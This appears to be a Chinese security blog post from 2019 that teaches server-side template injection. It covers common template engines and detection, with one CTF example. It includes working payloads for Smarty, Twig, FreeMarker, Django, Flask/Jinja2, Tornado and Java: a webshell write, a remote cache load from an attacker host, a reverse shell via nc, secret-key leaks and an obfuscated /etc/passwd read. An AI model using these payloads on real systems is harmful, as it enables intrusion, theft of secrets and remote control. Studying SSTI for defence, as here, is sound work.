---
title: 服务端模板注入攻击(SSTI)学习
key: 47cb7e7c7ba02967f978af6e1bea758b
tags:
  - SSTI
  - Summary
date: 2019-09-02 22:07:37
---

![](/assets/images/move/2019-09-02-22-44-13.png)

## 0x01 什么是SSTI

**服务端模板注入** (Server-Side Template Injection)，即服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。

模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程，这里使用 PHP 模版引擎 [Twig](https://twig.symfony.com/) 作为示例来说明服务端模板注入的原理，考虑如下代码：

```php
<?php
require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php';
Twig_Autoloader::register(true);
 
$twig = new Twig_Environment(new Twig_Loader_String());
$output = $twig->render("Hello \{\{name\}\}", array("name" => $_GET["name"]));  // 将用户输入作为模版变量的值
echo $output;
```

使用Twig模板引擎来渲染页面，模板中含有 `\{\{name\}\}`变量，其值来源于`$_GET\["name"\]`，由于模板引擎一般都默认对渲染的变量值进行编码和转义，很难构造恶意代码提交给服务端渲染产生跨站脚本攻击。但是，如果渲染的模板内容**可控**，将会引发服务端模板注入的问题，修改代码如下：

```php
<?php
require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php';
Twig_Autoloader::register(true);
 
$twig = new Twig_Environment(new Twig_Loader_String());
$output = $twig->render("Hello {$_GET['name']}");  // 将用户输入作为模版内容的一部分
echo $output;
```

上面这段代码代码在进行模板构建时，拼接了用户输入作为模板的内容，这里如果再向服务端直接传递恶意代码，用户输入将会原样输出。

- 例 OGeek 2019 Web Render

经 fuzz 发现模板引擎为 Thymeleaf，通过 Js 发送 Post 请求，传递 Json 数据给服务端进行模板构建，Thymeleaf 支持在 js 中直接获取 Model 中的变量，格式为 \[\[${name}\]\]，提交 `[[${1+1}]]`时回显2，代码成功执行，Payload 如下：

```java
new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('cat /flag').getInputStream())).readLine()
```

![](/assets/images/move/2019-08-25-22-12-25.png)


## 0x02 常见引擎

### PHP

- Smarty

[Smarty](https://www.smarty.net/docs/zh_CN/) 是一个使用PHP写出来的模板引擎，是业界最著名的PHP模板引擎之一。Smarty分离了逻辑代码和外在的内容，提供一种易于管理和使用的方法，用来将原本与HTML代码混杂在一起PHP代码逻辑分离。

- Twig

[Twig](https://www.kancloud.cn/yunye/twig-cn/159454) 是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。

- Blade

[Blade](https://learnku.com/docs/laravel/5.7/blade/2265) 是 Laravel 提供的一个既简单又强大的模板引擎。

和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。


### Python

- Jinja2

[Jinja2](http://docs.jinkan.org/docs/jinja2/) 是一个现代的，设计者友好的，仿照 Django 模板的 Python 模板语言。 它速度快，被广泛使用，并且提供了可选的沙箱模板执行环境保证安全.

- Django

[Django](https://docs.djangoproject.com/zh-hans/2.2/) 是用python语言写的开源web开发框架(open source web framework)，它鼓励快速开发,并遵循MVC设计。

- Tornado

[Tornado](https://tornado-zh.readthedocs.io/zh/latest/) 是一个Python Web框架和异步网络库，起初由 FriendFeed 开发. 通过使用非阻塞网络I/O， Tornado可以支撑上万级的连接，处理长连接, WebSockets ，和其他需要与每个用户保持长久连接的应用.

### Java

- JSP

[JSP](http://www.shouce.ren/api/jsp/) (Java server pages) 是Java平台上用于编写包含诸如HTML，DHTML，XHTML和XML等含有动态生成内容的Web页面的应用程序的技术。JSP技术功能强大，使用灵活，为创建显示动态Web内容的页面提供了一个简捷而快速的方法，相当经典。

- Velocity

[Velocity](https://www.ibm.com/developerworks/cn/java/j-lo-velocity1/index.html) 作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。

- Freemarker

[FreeMarker](http://freemarker.foofun.cn/) 是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。

- Thymeleaf

[Thymeleaf](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html) 是一款用于渲染XML/XHTML/HTML5内容的模板引擎。类似JSP，Velocity，FreeMaker等，它也可以轻易的与Spring MVC等Web框架进行集成作为Web应用的模板引擎。与其它模板引擎相比，Thymeleaf最大的特点是能够直接在浏览器中打开并正确显示模板页面，而不需要启动整个Web应用。




## 0x03 检测方法

同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。

简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。

![](/assets/images/move/2019-09-02-23-56-59.png)

> [Tplmap](https://github.com/epinna/tplmap) 是一款扫描服务器端模板注入漏洞的开源工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP、Ruby、JaveScript、Python、ERB、Jinja2 和 Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令功能。


## 0x04 攻击思路

### 模板特性

- Smarty

Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 PHP 安全函数白名单中的函数，因此我们在模板中无法直接调用 PHP 中直接执行命令的函数, 这是我们可以尝试在 Smarty 模板的一些特性中挖掘可以利用的类与方法。在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的好用的方法，比如：[getStreamVariable](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385)

该方法可获取传入变量的流(读取文件)，Payload:

```php
{self::getStreamVariable("file:///proc/self/loginuid")}
```

再比如 Class [Smarty_Internal_Write_File](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16) 中存在写文件的方法：

```php
public function writeFile($_filepath, $_contents, Smarty $smarty)
```

第3个参数为 Smarty 类型，最后落脚到 `self::clearConfig()`：

```php
public function clearConfig($varname = null) {
    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
}
```

Payload:

```php
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

- Twig

Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，无法使用 `self::` 调用静态变量。

在 [Twig官方文档](https://twig.symfony.com/doc/2.x/templates.html#global-variables) 中发现 Twig 为我们提供了全局变量`_self`(references the current template name).

同时Twig_Environment对象有一个 setCache 方法可用于更改 Twig 尝试加载和执行编译模板（PHP文件）的位置，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：

```php
\{\{_self.env.setCache("ftp://attacker.net:2121")\}\}
\{\{_self.env.loadTemplate("backdoor")\}\}
```

`allow_url_include`默认关闭，无法远程包含文件，这时还有个调用过滤器的函数 [getFilter($name)](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874)

```php
public function getFilter($name)
{
        [snip]
        foreach ($this->filterCallbacks as $callback) {
        if (false !== $filter = call_user_func($callback, $name)) { //<--- Attention
            return $filter;
        }
    }
    return false;
}
public function registerUndefinedFilterCallback($callable)
{
    $this->filterCallbacks[] = $callable;
} 
```

这里只需把 exec() 作为回调函数传入即可实现命令执行:

```php
\{\{_self.env.registerUndefinedFilterCallback("exec")\}\}
\{\{_self.env.getFilter("id")\}\}
```


- FreeMarker

Payload:

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

### 框架特性

- Django

```python
def view(request, *args, **kwargs):
    template = 'Hello {user}, This is your email: ' + request.GET.get('email')
    return HttpResponse(template.format(user=request.user))
```

这里的注入点明显就是`email`，但如果我们的能力被严格限制，难以执行命令，又想获取 User 的相关配置信息时应该怎么做呢？

> Django是一个庞大的框架，其数据库关系错综复杂，我们其实是可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，所以我的思路就是：去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项.

Django 自带的应用 admin 的 [models.py](https://github.com/django/django/blob/master/django/contrib/admin/models.py#L3) 中导入了当前网站的配置文件：

```python
from django.conf import settings
```

此时的思路为：想办法找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。

Payload:

```python
http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}
```

- Flask/Jinja2

config 是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：from_envvar, from_object, from_pyfile, 以及root_path。

```python
def from_pyfile(self, filename, silent=False):
    filename = os.path.join(self.root_path, filename)
    d = types.ModuleType('config')
    d.__file__ = filename
    try:
        with open(filename) as config_file:
            exec(compile(config_file.read(), filename, 'exec'), d.__dict__)
    except IOError as e:
        if silent and e.errno in (errno.ENOENT, errno.EISDIR):
            return False
        e.strerror = 'Unable to load configuration file (%s)' % e.strerror
        raise
    self.from_object(d)
    return True


def from_object(self, obj):
    if isinstance(obj, string_types):
        obj = import_string(obj)
    for key in dir(obj):
        if key.isupper():
            self[key] = getattr(obj, key)
```

此方法将传入的文件使用 compile() 内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 `d.__dict__` 翻阅文档发现，这个参数的含义是指定 exec 执行的上下文。

![](/assets/images/move/2019-09-03-16-49-51.png)

![](/assets/images/move/2019-09-03-16-54-01.png)

可以观察到执行的代码片段被放入了 `d.__dict__` 中，此时留意到后面所调用函数 from_object() 中的如下片段：

```python
for key in dir(obj):
    if key.isupper():
        self[key] = getattr(obj, key)
```

遍历 Obj 的 dict 并且找到大写字母的属性，将属性的值给 `self['属性名']`，所以说如果我们能让 from_pyfile 去读这样的一个文件：

```pyhton
from os import system
SHELL = system
```

到时候我们就能通过 `config['SHELL']` 调用 system 方法了.

Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，最终的Payload如下:

```python
\{\{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') \}\}
//写文件
\{\{ config.from_pyfile('/tmp/evil') \}\}
//加载system
\{\{ config['SHELL']('nc xxxx xx -e /bin/sh') \}\}
//执行命令反弹SHELL
```

\> \> [Python 沙盒逃逸备忘](https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/)


- Tornado

cookie_secret 是 handler.application.settings 的键值, handler 对应 RequestHandler， RequestHandler.settings 对应 self.application.settings，那么能直接通过 handler.settings 访问到 cookie_secret，Payload:

```python
?msg=\{\{handler.settings\}\}
```


### 语言特性

- Python

Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒。

- Java

java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类。

![](/assets/images/move/2019-09-03-17-07-10.png)

Payload:

```java
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('cat /flag').getInputStream())).readLine()
```

文件操作：

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## 0x05 防御方法

- 和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制

- 减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法


## 0x06 参考链接

- [一篇文章带你理解漏洞之 SSTI 漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/)

- [服务端模板注入攻击 (SSTI) 之浅析](https://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/)

- [Flask之 SSTI 模版注入从零到入门](https://xz.aliyun.com/t/3679)

- [Server-Side Template Injection: RCE for the modern webapp](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)


